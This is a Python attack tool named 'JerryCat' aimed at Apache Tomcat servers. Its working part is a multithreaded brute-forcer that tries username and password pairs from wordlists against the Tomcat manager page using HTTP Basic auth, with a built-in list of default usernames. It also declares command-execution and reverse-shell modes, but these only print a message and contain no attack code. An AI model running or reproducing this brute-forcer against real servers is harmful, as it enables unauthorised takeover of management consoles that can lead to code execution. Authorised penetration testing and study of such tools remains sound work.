import argparse
import sys
import concurrent.futures
import requests
from requests.auth import HTTPBasicAuth

from termcolor import *

# Global variable to access state of args and my single instance of my class output (yes, not the cleanest way)
global args
global output

# progress_bar object - serve as a model
'''
Putting in comment as its not use anymore (maybe need it later)
progress_bar = Progress(
    "{task.description}",
    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
    BarColumn(),
    MofNCompleteColumn(),
    TextColumn("•"),
    TimeElapsedColumn(),
    TextColumn("•"),
    TimeRemainingColumn(),
)'''

# common username list of tomcat's most common username - serve as backup if no user list
common_username: list[str] = [
    "tomcat",
    "manager",
    "role1",
    "root",
    "admin"
]


# TODO : Make a class for output statement [+], [-], like output.success("description of the output")
class output_class:
    def __init__(self):
        self.description = ""

    def message(self, state: str, description: str, clear_previous_line: bool) -> None:
        self.description = description

        if clear_previous_line:
            sys.stdout.write("\033[F")  # back to previous line
            sys.stdout.write("\033[K")  # clear line

        match state:
            case "success":
                cprint("[+] ", "green", end="")
            case "failed":
                cprint("[-] ", "red", end="")
            case "error":
                cprint("[!] ", "yellow", end="")
            case "ongoing":
                cprint("[*] ", "blue", end="")

        print(self.description)

    def verbose(self, state: str, description: str, clear_previous_line: bool) -> None:
        if args.verbose:
            self.message(state, description, clear_previous_line)


# Brute force mode function
class Brute:
    def __init__(self, url: str, userlist: str, wordlist: str):
        self.url = url
        self.userlist = userlist
        self.wordlist = wordlist

    def brute_worker(self, username, password):
        auth = HTTPBasicAuth(username, password)
        response = requests.get(f"{self.url}/manager/html", auth=auth)
        if response.status_code == 200:
            output.verbose(state="success", description=f"{username}:{password}", clear_previous_line=False)
            return username, password
        else:
            output.verbose(state="failed", description=f"{username}:{password}", clear_previous_line=False)
            return None

    def brute(self):
        if self.userlist is None:
            self.userlist = common_username
        else:
            with open(self.userlist, 'r') as file:
                self.userlist = file.read().splitlines()

        output.message(state="ongoing", description="Brute force is running...", clear_previous_line=False)

        with open(self.wordlist, "r", encoding="utf-8", errors="ignore") as open_wordlist:
            passwords = open_wordlist.readlines()

        with concurrent.futures.ThreadPoolExecutor() as executor:
            tasks = []
            for username in self.userlist:
                for password in passwords:
                    password = password.strip()
                    task = executor.submit(self.brute_worker, username, password)
                    tasks.append(task)

            credentials = []

            for future in concurrent.futures.as_completed(tasks):
                result = future.result()

                if result:
                    new_credentials = {'username': result[0], 'password': result[1]}
                    credentials.append(new_credentials)

            output.message(state="success", description="Brute force done!", clear_previous_line=True)

            if credentials:
                return credentials

        return False


def banner() -> str:
    return '''

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠲⢤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡴⠞⢛⣩⡽⠿⠛⠛⠷⣄⠀⠀
⠀⡷⢶⣶⡶⠶⠤⠤⢤⣄⣀⣀⠀⠀⠀⠀⣀⣀⣀⣀⠀⠈⠙⢿⣶⣄⠀⠀⠀⠀⠀⠀⢀⣴⠟⢉⣤⠾⠋⠁⠀⠀⠀⠀⠀⠘⣷⠀
⠀ ⠀⠈⠻⢶⣄⠀⠀⠀⠀⠉⠉⠛⠲⠦⣤⣀⠀⠉⠙⠻⢶⣦⣍⣻⣿⣦⡀⠀⢀⣴⠟⢁⡴⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣇
⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢲⣤⣀⣀⣈⣻⣿⣿⠎⠻⣤⠟⠁⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿
⠀⠀⠀⠀⠀⠀⠀⠀⠙⢷⣄⠀⠀⢀⣠⡴⠶⠛⠋⠉⠉⠁⠀⠀⠀⠀⠀⠀⣰⠏⠀⣸⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣷⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠋⠀⢀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⢀⣠⠀⠀⠀⠀⠀⠀⠀⢰⠃
⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣾⣀⣀⣀⣤⠟⠃⠀⠀⠀⠀⠀⠀⢠⡏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣼⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⠶⠛⠛⠻⠂⠀⠀⠀⠀⠀⠈⢉⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⣠⡟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢻⡿⣶⣄⠀⠀⠀⠀⠀⠀⢠⠞⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⣠⡾⠋⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⡇⠈⠛⠀⢰⡄⣶⠀⠀⠀⢀⣤⣶⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣀⠈⢿⣤⣀⣀⣀⣀⣤⠞⠋⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡶⢦⣄⡈⣷⣿⣀⣠⠶⠋⠻⠿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠳⣦⠬⠽⠟⠛⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠤⢴⠤⣤⣄⣀⣀⣴⣿⠛⠻⢦⣹⢿⣿⣿⣿⣿⣄⠀⢀⣰⠇⠀⣀⣀⣀⣤⣤⠤⠴⠶⠶⢶⠟⠒⠒⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀  ⠀⠀⠀⢸⣿⣿⣿⣿⣾⣿⡿⢿⡿⠛⢠⣬⣿⣿⣿⣿⣯⣭⣭⣤⣤⣤⣤⣴⣤⣴⣏⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠸⠋⠉⠉⠉⠉⠙⢿⣿⣿⣷⣬⣷⡈⣧⣄⣀⠹⣧⠀⠀⡟⢹⣦⣄⣴⡟⠁⢀⣀⣀⠙⢦⡀⠀⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣼⠋⠉⠉⠛⣿⠿⣯⣿⣯⣗⣼⣷⣦⣿⣿⡿⠿⠾⠿⠿⠭⣍⣉⡉⠛⠻⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⡁⠀⠀⠀⢠⡏⢀⡴⠋⠁⠀⠀⠀⢈⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⢦⣸⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⠃⠀⠀⣠⡾⣷⠏⠀⠀⠀⠀⠀⠀⣸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠙⢿⠷⠤⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⢿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠸⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡼⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⢰⣷⠃⠀⠀⠀⢸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⠉⠙⠒⠒⠒⠒⠒⠒⠒⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠁⠀⠀⠀⠀⠸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

                                                  JerryCat By Anh4ckin3 & Talace

'''


def main():
    global output, args

    parser = argparse.ArgumentParser(description="jerrycat the good guy !")
    group = parser.add_mutually_exclusive_group()
    group.add_argument("-v", "--verbose", action="store_true", default=False)

    # choose mode
    parser.add_argument("mode", choices=["brute", "exec", "reverse"],
                        help="Mode: bruteforce, command, or reverse shell")

    # TODO : See if we need to update this option below because -U is already an option? (like --host --ip)
    parser.add_argument('-u', '--url', dest='url', help='url of the tomcat app')

    # Brute mode
    brute_mode = parser.add_argument_group("Brute Options")
    parser.add_argument('-w', '--wordlist', dest='wordlist', help='path on your own wordlist')
    parser.add_argument('-l', '--user-list', dest='userlist', help='User list ( default tomcat )')

    # exec mode
    exec_mode = parser.add_argument_group("Command execution Options")
    parser.add_argument('-U', '--user', dest='user', help='tomcat user')
    parser.add_argument('-p', '--password', dest='password', help='tomcat user password')

    # reverse shell mode
    reverse_mode = parser.add_argument_group("reverse shell Options")
    reverse_mode.add_argument('-R', '--reverse', dest='reverse', help='path to your reverse shell payload')

    args = parser.parse_args()

    # instance new class
    output = output_class()

    # banner draw of the tool
    print(banner())

    # switch for mode
    match args.mode:
        # settings for brute mode
        case 'brute':
            if not all([args.url, args.wordlist]):
                parser.error(" -u and -w arguments are requires for this mode.")
            else:

                cprint("[+]", "green", end="")
                print(" Mode Brute selected")

                brute_instance = Brute(args.url, args.userlist, args.wordlist)
                credentials_found = brute_instance.brute()

                # sys.stdout.write("\033[F")  # back to previous line
                # sys.stdout.write("\033[K")  # clear line

                if not credentials_found:
                    output.message("failed", f"No user or password is matching ! :(", False)
                else:
                    for credential in credentials_found:
                        username_found = credential.get('username')
                        password_found = credential.get('password')

                        output.message("success", f"Find user and password : {username_found}:{password_found}",
                                       False)
        # settings for exec mode
        case 'exec':
            if not all([args.url, args.user, args.password]):
                parser.error("-u, -U, -p arguments are requires for this mode.")
            else:
                print("Command execution mode selected")

        # settings for reverse mode
        case 'reverse':
            if not all([args.url, args.user, args.password, args.reverse]):
                parser.error("-u, -U, -p arguments are requires for this mode.")
            else:
                print("Reverse shell mode selected")


if __name__ == "__main__":
    main()
